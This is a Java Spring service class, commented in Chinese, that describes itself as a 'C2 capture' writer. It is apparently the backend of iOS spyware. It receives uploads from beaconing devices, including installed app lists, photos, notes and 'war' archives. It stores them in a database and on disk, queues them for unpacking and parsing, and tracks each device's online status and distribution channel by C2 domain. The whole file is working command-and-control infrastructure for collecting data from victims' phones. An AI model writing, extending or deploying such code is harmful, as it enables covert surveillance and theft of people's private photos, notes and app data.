package com.ctwo.service.impl;

import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.HashMap;
import java.util.LinkedHashSet;
import java.util.Map;
import java.util.Set;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.ctwo.dao.AppListDao;
import com.ctwo.dao.ChannelDao;
import com.ctwo.dao.DeviceDao;
import com.ctwo.dao.Ios18ParamDao;
import com.ctwo.entity.AppListEntity;
import com.ctwo.entity.ChannelEntity;
import com.ctwo.entity.DeviceEntity;
import com.ctwo.entity.Ios18ParamEntity;
import com.ctwo.service.CaptureStorageService;
import com.ctwo.util.DomainMatchUtil;
import com.ctwo.util.RedisPush;

/**
 * C2 capture 异步落库写入器。
 *
 * <p><b>独立 Bean</b>：必须独立成类，让 Spring AOP 代理生效。
 * 在 {@link com.ctwo.service.impl.ApiServiceImpl} 内用 {@code this.capture()} 调用会让
 * {@link Async} / {@link Transactional} 注解全部失效（同类 this 调用绕过代理）。
 *
 * <p>异步线程池：{@code databaseOperateStreamPush}（见 {@link com.ctwo.config.AsyncConfig}）。
 * HTTP 请求线程只做读 body + 派发，预期请求耗时 <5ms。
 *
 * <p>Redis 推送：通过 {@link RedisPush#notifyNewRecord(Object)} 再走
 * {@code redisPushStreamPush} 线程池，两次异步解耦。
 *
 * <p><b>事务策略</b>：capture / captureSync / captureAndEnqueueNb 均<b>不加</b>
 * {@code @Transactional}——单条 insert 自动提交，确保入队前数据已落盘可见，
 * 避免 Consumer 读取不到 ios18param 记录。仅 {@link #handleU} 加事务（applist 多条 upsert 原子性）。
 */
@Service
public class CtwoAsyncWriter {

    private static final Logger log = LoggerFactory.getLogger(CtwoAsyncWriter.class);

    @Autowired
    private Ios18ParamDao ios18ParamDao;

    @Autowired
    private DeviceDao deviceDao;

    @Autowired
    private ChannelDao channelDao;

    @Autowired
    private AppListDao appListDao;

    @Autowired
    private RedisPush redisPush;

    @Autowired
    private CaptureStorageService captureStorage;

    /**
     * 异步入库 ios18param，并按需推 Redis Stream。
     * 不加 @Transactional：单条 insert 自动提交，确保入队前数据已落盘可见。
     */
    @Async("databaseOperateStreamPush")
    public void capture(Ios18ParamEntity entity, boolean skipRedis) {
        try {
            ios18ParamDao.insert(entity);
            log.info("ios18param 写入成功 kind={} ip={} path={}",
                    entity.getKind(), entity.getClientIp(), entity.getPath());
            if (!skipRedis && entity.getId() != null) {
                redisPush.notifyNewRecord(entity);
            }
        } catch (Exception e) {
            log.info("ios18param 写入失败 kind={} ip={} path={} err={}",
                    entity.getKind(), entity.getClientIp(), entity.getPath(), e.toString(), e);
        }
    }

    /**
     * 同步落库（供 /war 使用，需要立即返回 ios18param_id 给客户端）。
     * 不加 @Transactional：单条 insert 自动提交，确保入队前数据已落盘可见。
     */
    public void captureSync(Ios18ParamEntity entity, boolean skipRedis) {
        try {
            ios18ParamDao.insert(entity);
            if (!skipRedis && entity.getId() != null) {
                redisPush.notifyNewRecord(entity);
            }
        } catch (Exception e) {
            log.error("captureSync FAIL kind={} ip={} path={} err={}",
                    entity.getKind(), entity.getClientIp(), entity.getPath(), e.toString(), e);
        }
    }

    /**
     * /nb 专用：异步入库 + 入队 nb_memorandum（ACK-first，不阻塞 HTTP 响应）。
     * 在异步线程中执行文件落盘（如需），避免 HTTP 线程 I/O 阻塞。
     * 不加 @Transactional：单条 insert 自动提交，确保入队前数据已落盘可见。
     *
     * @param entity   已填充公共字段的 ios18param 实体
     * @param bodyBytes body 的 UTF-8 字节（用于落盘 / 入队）
     * @param rawBody  body 原始字符串（用于 Base64 编码入队）
     */
    @Async("databaseOperateStreamPush")
    public void captureAndEnqueueNb(Ios18ParamEntity entity, byte[] bodyBytes, String rawBody) {
        try {
            int bodyLen = bodyBytes == null ? 0 : bodyBytes.length;
            if (bodyLen == 0) {
                return;
            }
            // 阈值分流：在异步线程内执行文件落盘（避免 HTTP 线程 I/O）
            if (bodyLen > captureStorage.getBodyInlineMax()) {
                String rel = captureStorage.dumpToFile(bodyBytes, "nb", entity.getDeviceId());
                if (rel != null) {
                    entity.setStorage("file");
                    entity.setFilePath(rel);
                    entity.setBody("");
                } else {
                    entity.setStorage("inline");
                    entity.setBody(rawBody == null ? "" : rawBody);
                }
            } else {
                entity.setStorage("inline");
                entity.setBody(rawBody == null ? "" : rawBody);
            }

            ios18ParamDao.insert(entity);
            log.info("ios18param 写入成功 kind=nb ip={} id={} storage={}",
                    entity.getClientIp(), entity.getId(), entity.getStorage());
            if (entity.getId() != null) {
                enqueueNbMemorandum(entity, rawBody);
            }
        } catch (Exception e) {
            log.error("captureAndEnqueueNb FAIL kind=nb ip={} err={}", entity.getClientIp(), e.toString(), e);
        }
    }

    /**
     * /u、/p 先于 /a 时的建机兜底：与 device-server /a、/beacon 对齐——
     * 有则升为绑定+在线，无则 INSERT；channelcode 空时按域名查 qudao.c2_domain。
     *
     * @return 可用的 device；uuid 空则 null
     */
    public DeviceEntity ensureDeviceBound(String uuid, String domain, String clientIp) {
        if (uuid == null || uuid.isEmpty()) {
            return null;
        }
        double now = System.currentTimeMillis() / 1000.0;
        // 并发 /p|/u|/a|/beacon 同 uuid 建机：查→插竞态常见，冲突后重查（双列）再更新
        for (int attempt = 1; attempt <= 3; attempt++) {
            try {
                DeviceEntity existing = deviceDao.findByDeviceId(uuid);
                if (existing != null) {
                    touchBoundDevice(existing, domain, clientIp, now);
                    return existing;
                }

                DeviceEntity neu = new DeviceEntity();
                neu.setDeviceId(uuid);
                neu.setDevice_id(uuid);
                neu.setChannelCode("");
                neu.setDomain(domain == null ? "" : domain);
                neu.setIp(clientIp);
                neu.setAddtime(now);
                neu.setIpstatus(0);
                neu.setDevicestatus(1);
                neu.setOnlinestatus(1);
                neu.setBindPhase(1);
                neu.setLastEventAt(now);
                neu.setModel("");
                neu.setDeviceName("");
                neu.setIosVersion("");
                neu.setC2Series(1);
                fillChannelIfBlank(neu, domain);
                try {
                    deviceDao.insert(neu);
                    log.info("[/u|/p] 设备兜底新建 uuid={} ip={} channel={}",
                            uuid, clientIp, neu.getChannelCode());
                    return neu;
                } catch (org.springframework.dao.DuplicateKeyException dup) {
                    DeviceEntity again = deviceDao.findByDeviceId(uuid);
                    if (again != null) {
                        touchBoundDevice(again, domain, clientIp, now);
                        return again;
                    }
                    if (attempt < 3) {
                        try {
                            Thread.sleep(20L * attempt);
                        } catch (InterruptedException ie) {
                            Thread.currentThread().interrupt();
                            return null;
                        }
                        continue;
                    }
                    log.info("[/u|/p] 设备兜底新建冲突后仍未命中 uuid={} ip={} err={}",
                            uuid, clientIp, dup.toString());
                    return null;
                }
            } catch (Exception e) {
                log.info("[/u|/p] 设备兜底失败 uuid={} ip={} err={}", uuid, clientIp, e.toString());
                return null;
            }
        }
        return null;
    }

    private void touchBoundDevice(DeviceEntity existing, String domain, String clientIp, double now) {
        existing.setIp(clientIp);
        existing.setBindPhase(1);
        existing.setDevicestatus(1);
        existing.setOnlinestatus(1);
        existing.setLastEventAt(now);
        existing.setC2Series(1);
        // 双列互相同步，避免只写一边导致下次查 miss
        if (DomainMatchUtil.isBlank(existing.getDeviceId()) && !DomainMatchUtil.isBlank(existing.getDevice_id())) {
            existing.setDeviceId(existing.getDevice_id());
        }
        if (DomainMatchUtil.isBlank(existing.getDevice_id()) && !DomainMatchUtil.isBlank(existing.getDeviceId())) {
            existing.setDevice_id(existing.getDeviceId());
        }
        fillChannelIfBlank(existing, domain);
        if (DomainMatchUtil.isBlank(existing.getDomain()) && !DomainMatchUtil.isBlank(domain)) {
            existing.setDomain(domain);
        }
        deviceDao.updateById(existing);
    }

    private boolean fillChannelIfBlank(DeviceEntity device, String domainRaw) {
        if (device == null || !DomainMatchUtil.isBlank(device.getChannelCode())) {
            return false;
        }
        String host = DomainMatchUtil.normalizeHostKeepPort(domainRaw);
        if (host.isEmpty() && !DomainMatchUtil.isBlank(device.getDomain())) {
            host = DomainMatchUtil.normalizeHostKeepPort(device.getDomain());
        }
        if (host.isEmpty()) {
            return false;
        }
        try {
            ChannelEntity ch = channelDao.findByC2DomainHost(host);
            if (ch == null || DomainMatchUtil.isBlank(ch.getChannelcode())) {
                return false;
            }
            device.setChannelCode(ch.getChannelcode().trim());
            log.info("[/u|/p] 域名兜底渠道 uuid={} host={} channel={}",
                    device.getDeviceId(), host, device.getChannelCode());
            return true;
        } catch (Exception e) {
            log.warn("[/u|/p] 域名查渠道失败 host={} uuid={} err={}",
                    host, device.getDeviceId(), e.toString());
            return false;
        }
    }

    /**
     * /u 应用列表业务逻辑：解析 body → 过滤 apple → 去重 → upsert applist。
     * 加 @Transactional：applist 多条 upsert 需原子性（/u 不涉及 Redis 入队，无 Consumer 可见性问题）。
     */
    @Async("databaseOperateStreamPush")
    @Transactional
    public void handleU(String rawBody, String uuid, String clientIp, String domain) {
        if (uuid == null || uuid.isEmpty()) {
            return;
        }
        try {
            DeviceEntity device = ensureDeviceBound(uuid, domain, clientIp);
            if (device == null) {
                log.info("/u 上报： 设备兜底后仍不存在 uuid={} ip={}", uuid, clientIp);
                return;
            }
            JSONObject json = JSON.parseObject(rawBody);
            if (json == null) {
                log.info("/u 上报：aps解析失败 uuid={} ip={}", uuid, clientIp);
                return;
            }
            JSONArray apps = json.getJSONArray("apps");
            if (apps == null) {
                return;
            }
            // 过滤 apple + 去重 + upsert
            Set<String> seen = new LinkedHashSet<>();
            int upserted = 0;
            for (int i = 0; i < apps.size(); i++) {
                JSONObject app = apps.getJSONObject(i);
                if (app == null) continue;
                // 兼容 camelCase（bundleId, appId）与 snake_case（bundle_id, appid）
                String appId = app.getString("appid");
                if (appId == null) appId = app.getString("appId");
                String bundleId = app.getString("bundle_id");
                if (bundleId == null) bundleId = app.getString("bundleId");
                // 过滤：appid == "apple" 或 bundleId 以 com.apple. 开头
                if ("apple".equalsIgnoreCase(appId)) continue;
                if (bundleId != null && bundleId.startsWith("com.apple.")) continue;
                // 去重 key
                String key = (appId == null ? "" : appId) + "|" + (bundleId == null ? "" : bundleId);
                if (!seen.add(key)) continue;

                AppListEntity exist = appListDao.findOne(device.getId(), app.getString("name"));
                if (exist != null) {
                    exist.setAddtime(System.currentTimeMillis() / 1000.0);
                    appListDao.updateById(exist);
                } else {
                    AppListEntity appListEntity = new AppListEntity();
                    appListEntity.setAppName(app.getString("name"));
                    appListEntity.setVersion(app.getString("version"));
                    appListEntity.setBundleId(bundleId);
                    appListEntity.setDeviceRowYd(device.getId());
                    appListEntity.setDeviceUid(device.getDeviceId());
                    appListEntity.setAddtime(System.currentTimeMillis() / 1000.0);
                    appListDao.insert(appListEntity);
                }
                upserted++;
            }
            log.info("/u 应用列表写入成功 uuid={} ip={} apps={} upserted={}",
                    uuid, clientIp, apps.size(), upserted);
        } catch (Exception e) {
            log.error("/u 应用列表写入失败 uuid={} ip={} err={}", uuid, clientIp, e.toString(), e);
        }
    }


    // ==================== 通用 capture 异步派发（阈值分流 + 大 body 异步落盘） ====================

    /**
     * 通用异步 capture：把 HTTP 线程中的 dumpToFile 搬到 databaseOperateStreamPush 池执行。
     *
     * <p>流程（完全对齐 dispatchCapture 的 inline/file 分流，但 I/O 全在异步线程）：
     * <ol>
     *   <li>bodyLen ≤ body_inline_max → storage=inline, body=rawBody, 直接 insert</li>
     *   <li>bodyLen > 阈值 → 异步 dumpToFile；失败则回退 inline（避免丢数据）</li>
     *   <li>insert 完成后：非 skip_store 场景按常规走 notifyNewRecord（Redis 推 capture）</li>
     * </ol>
     *
     * <p>好处：大 body（比如 1MB 的 event/result body）的磁盘 I/O 不阻塞 Tomcat 线程，
     * 高并发下 HTTP 线程池不被大量 I/O wait 占满，接口整体 QPS 显著提升。
     */
    @Async("databaseOperateStreamPush")
    public void captureAsyncDispatch(Ios18ParamEntity entity, byte[] bodyBytes, String rawBody,
                                     String kind, boolean noRedis) {
        if (entity == null || bodyBytes == null) return;
        try {
            int bodyLen = bodyBytes.length;
            if (bodyLen > captureStorage.getBodyInlineMax()) {
                // 异步线程里落盘
                String uuid = entity.getDeviceId() == null ? "" : entity.getDeviceId();
                String rel = captureStorage.dumpToFile(bodyBytes, kind, uuid);
                if (rel != null) {
                    entity.setStorage("file");
                    entity.setFilePath(rel);
                    entity.setBody("");
                } else {
                    entity.setStorage("inline");
                    entity.setBody(rawBody == null ? "" : rawBody);
                }
            } else {
                entity.setStorage("inline");
                entity.setBody(rawBody == null ? "" : rawBody);
            }
            ios18ParamDao.insert(entity);
            log.debug("ios18param captureAsyncDispatch ok kind={} id={} storage={} bytes={}",
                    kind, entity.getId(), entity.getStorage(), bodyLen);
            if (!noRedis && entity.getId() != null) {
                redisPush.notifyNewRecord(entity);
            }
        } catch (Exception e) {
            log.error("captureAsyncDispatch FAIL kind={} err={}", kind, e.toString(), e);
        }
    }

    // ==================== war 落盘后入队（§3.6 / §5.1） ====================

    /**
     * war 落盘 + 同步入库后，入 war_unpack 队列：
     * <ul>
     *   <li>{@code api18:tasks}（job=war_unpack）→ Consumer 解包 .bin → UPDATE unpack_path
     *       → <b>解包成功后链式入队 parse_ci</b>（在 CaptureDispatchService.handleWarUnpack 内触发）。</li>
     * </ul>
     *
     * <p>parse_ci 不再在此处直接入队：确保 war_unpack 先完成 unpack_path 落库，
     * parse_ci 才能读到解压目录（避免竞态读到空 unpack_path）。
     */
    public void enqueueWarJobs(Ios18ParamEntity entity) {
        if (entity == null || entity.getId() == null) {
            return;
        }
        String idStr = String.valueOf(entity.getId());
        String filePath = entity.getFilePath() == null ? "" : entity.getFilePath();
        String deviceId = entity.getDeviceId() == null ? "" : entity.getDeviceId();
        String kind = entity.getKind();

        Map<String, String> unpackJob = new HashMap<>();
        unpackJob.put("job", "war_unpack");
        unpackJob.put("ios18param_id", idStr);
        unpackJob.put("file_path", filePath);
        unpackJob.put("kind", kind);
        unpackJob.put("device_id", deviceId);
        redisPush.notifyNewRecord(unpackJob, redisPush.streamMain());

        log.debug("enqueueWarJobs id={} kind={} file={}", entity.getId(), kind, filePath);
    }

    // ==================== /nb 入队（§3.5 / §5.1） ====================

    /**
     * /nb 入队 nb_memorandum → api18:tasks。
     * Consumer 读取后写 memorandum 表。
     * 文档 §3.4: capture 为 file → 任务只带 file_path；否则带 body_b64。
     */
    public void enqueueNbMemorandum(Ios18ParamEntity entity, String rawBody) {
        if (entity == null || entity.getId() == null) {
            return;
        }
        Map<String, String> job = new HashMap<>();
        job.put("job", "nb_memorandum");
        job.put("ios18param_id", String.valueOf(entity.getId()));
        job.put("kind", "nb");
        job.put("device_id", entity.getDeviceId() == null ? "" : entity.getDeviceId());
        String storage = entity.getStorage() == null ? "inline" : entity.getStorage();
        job.put("storage", storage);
        if ("file".equals(storage)) {
            job.put("file_path", entity.getFilePath() == null ? "" : entity.getFilePath());
        } else {
            job.put("body_b64", rawBody == null ? "" : Base64.getEncoder()
                    .encodeToString(rawBody.getBytes(StandardCharsets.UTF_8)));
        }
        redisPush.notifyNewRecord(job, redisPush.streamMain());
        log.info("备忘录队列发送 id={} device={} storage={}", entity.getId(), entity.getDeviceId(), storage);
    }

    // ==================== /p 照片上传：落盘 + 入库 + 入队 photo 队列 ====================

    /**
     * /p 照片上传异步处理：图片始终落盘 → INSERT ios18param → 发送 photo 队列消息。
     * 在 databaseOperateStreamPush 异步线程中执行，HTTP 线程不阻塞。
     *
     * @param entity     已填充公共字段的 ios18param 实体
     * @param fileBytes  图片二进制内容（从 multipart 提取，不含 multipart 边界）
     * @param rawBody    原始 body 字符串（multipart 模式下为 null，不影响）
     * @param photoMeta  照片元数据（filename/seq/md5 等，可为 null）
     */
    @Async("databaseOperateStreamPush")
    public void captureAndEnqueuePhoto(Ios18ParamEntity entity, byte[] fileBytes,
                                       String rawBody, Map<String, String> photoMeta,
                                       String domain) {
        if (entity == null || fileBytes == null) return;
        try {
            String uuid = entity.getDeviceId() == null ? "" : entity.getDeviceId();
            if (!uuid.isEmpty()) {
                ensureDeviceBound(uuid, domain, entity.getClientIp());
            }

            int fileLen = fileBytes.length;
            // 照片始终落盘（二进制图片不适合存 text body 列）
            String rel = captureStorage.dumpToFile(fileBytes, "p", entity.getDeviceId());
            if (rel != null) {
                entity.setStorage("file");
                entity.setFilePath(rel);
                entity.setBody("");
            } else {
                // 落盘失败：base64 编码存 inline（极端兜底）
                entity.setStorage("inline");
                entity.setBody(java.util.Base64.getEncoder().encodeToString(fileBytes));
            }

            ios18ParamDao.insert(entity);
            log.info("photo ios18param 写入成功 id={} device={} storage={} bytes={}",
                    entity.getId(), entity.getDeviceId(), entity.getStorage(), fileLen);

            // 发送 photo 队列消息（供 consumer 处理图片入库 album 表）
            if (entity.getId() != null) {
                Map<String, String> job = new HashMap<>();
                job.put("job", "photo_upload");
                job.put("ios18param_id", String.valueOf(entity.getId()));
                job.put("device_id", entity.getDeviceId() == null ? "" : entity.getDeviceId());
                job.put("body_bytes", String.valueOf(fileLen));
                job.put("storage", entity.getStorage() == null ? "file" : entity.getStorage());
                if ("file".equals(entity.getStorage())) {
                    job.put("file_path", entity.getFilePath() == null ? "" : entity.getFilePath());
                }
                // 附加照片元数据
                if (photoMeta != null) {
                    for (Map.Entry<String, String> e : photoMeta.entrySet()) {
                        if (e.getValue() != null && !e.getValue().isEmpty()) {
                            job.put(e.getKey(), e.getValue());
                        }
                    }
                }
                redisPush.notifyNewRecord(job, redisPush.streamPhoto());
                log.info("photo 队列发送成功 id={} device={}", entity.getId(), entity.getDeviceId());
            }
        } catch (Exception e) {
            log.error("captureAndEnqueuePhoto FAIL device={} err={}", entity.getDeviceId(), e.toString(), e);
        }
    }
}
